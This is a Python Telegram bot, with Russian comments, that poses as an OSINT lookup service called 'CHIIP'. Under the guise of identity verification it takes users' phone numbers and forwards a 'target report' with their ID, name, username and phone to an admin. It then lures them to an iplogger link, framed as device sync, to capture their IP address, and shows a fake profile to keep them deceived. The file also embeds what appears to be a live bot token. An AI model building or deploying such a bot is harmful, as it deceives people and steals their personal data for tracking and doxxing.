import logging
import os
import threading
from datetime import datetime

# Импорты из твоих скриншотов
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

# --- НАСТРОЙКИ (Данные из скриншота 1000006458.png) ---
API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIK0QYira73S8B-0qlXc'
ADMIN_ID = 5476069446
LOGGER_URL = "https://iplogger.org/YOUR_CODE" 

# --- ХАК ДЛЯ БЕСПЛАТНОГО RENDER ---
# Это создает веб-сервер, который "обманывает" Render, отвечая на порту
app = Flask(__name__)

@app.route('/')
def health_check():
    return "CHIIP System Online", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- ИНИЦИАЛИЗАЦИЯ БОТА ---
bot = Bot(token=API_TOKEN, parse_mode="Markdown")
dp = Dispatcher(bot)

# Клавиатура авторизации
contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
contact_kb.add(KeyboardButton("✅ Подтвердить личность", request_contact=True))

# Главное меню OSINT (как на скриншоте 1000006452.png)
def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("📊 Профиль", callback_data="prof"),
        InlineKeyboardButton("🔔 Следить", callback_data="follow"),
        InlineKeyboardButton("🔗 Имена, @теги", callback_data="names"),
        InlineKeyboardButton("👁 Группы", callback_data="groups"),
        InlineKeyboardButton("💬 Сообщения", callback_data="msgs"),
        InlineKeyboardButton("🔎 Анализ", callback_data="anal"),
        InlineKeyboardButton("📢 Каналы", callback_data="chan"),
        InlineKeyboardButton("👍 Репутация", callback_data="rep"),
        InlineKeyboardButton("👥 Знакомые", callback_data="friends"),
        InlineKeyboardButton("🤩 Реакции", callback_data="reac"),
        InlineKeyboardButton("🎁 Подарки", callback_data="gift"),
        InlineKeyboardButton("🤝 Поделиться", callback_data="share"),
        InlineKeyboardButton("🗣 Частота слов", callback_data="words"),
        InlineKeyboardButton("👥 Общие группы", callback_data="common")
    )
    return kb

# --- ОБРАБОТЧИКИ ---

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    # Текст из скриншота 1000006458.png
    await message.answer(
        "🚀 **Система CHIIP: Авторизация**\n\n"
        "Для получения доступа к закрытому функционалу необходимо подтвердить номер телефона.",
        reply_markup=contact_kb
    )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    contact = message.contact
    user = message.from_user
    
    # Кнопка с логгером
    ip_kb = InlineKeyboardMarkup()
    ip_kb.add(InlineKeyboardButton("🔗 Завершить настройку (нажми сюда)", url=f"{LOGGER_URL}"))

    # Отчет для админа
    report = (
        f"🕵️ **ОТЧЕТ О ЦЕЛИ**\n"
        f"━━━━━━━━━━━━━━\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"👤 **Имя:** {user.full_name}\n"
        f"🏷 **Username:** @{user.username if user.username else 'нет'}\n"
        f"📱 **Телефон:** +{contact.phone_number}\n"
        f"🌐 **Язык:** {user.language_code}\n"
        f"💎 **Premium:** {'Да' if user.is_premium else 'Нет'}\n"
        f"━━━━━━━━━━━━━━\n"
        f"⚠️ *Ожидайте перехода по ссылке для фиксации IP...*"
    )

    await bot.send_message(ADMIN_ID, report)
    
    # Ответ пользователю
    await message.answer(
        "Номер подтвержден! Последний шаг: перейдите по ссылке ниже, чтобы синхронизировать устройство с сервером.",
        reply_markup=ip_kb
    )
    
    # Через 3 секунды отправляем фейковый OSINT профиль
    await message.answer("✅ Синхронизация завершена. Доступ открыт.")
    await show_fake_profile(message)

async def show_fake_profile(message: types.Message):
    # Данные из скриншота 1000006450.png
    profile_text = (
        f"Разнообразие сообщ: 76.97%\n"
        f"С 19.05.2025 по 22.11.2025\n"
        f"**10192** сообщений в **78** чатах\n"
        f"59.76% реплаи, 6.79% медиа\n"
        f"Кружки: 2, голос: 3\n"
        f"Любимый чат: CHIIP_HUB\n"
        f"Админ в чатах: 1\n"
        f"Искали: 26\n"
        f"Репутация: **в основном отрицательная**\n\n"
        f"🆔 **ID:** `{message.from_user.id}`\n"
        f"**usernames:** @{message.from_user.username}\n"
        f"**Имена:**\n"
        f"└ {datetime.now().strftime('%Y-%m-%d')} ➡️ {message.from_user.full_name}\n"
    )
    await message.answer(profile_text, reply_markup=get_main_menu())

# --- ЗАПУСК ---
if __name__ == '__main__':
    # Запускаем Flask в отдельном потоке
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Запускаем бота
    executor.start_polling(dp, skip_updates=True)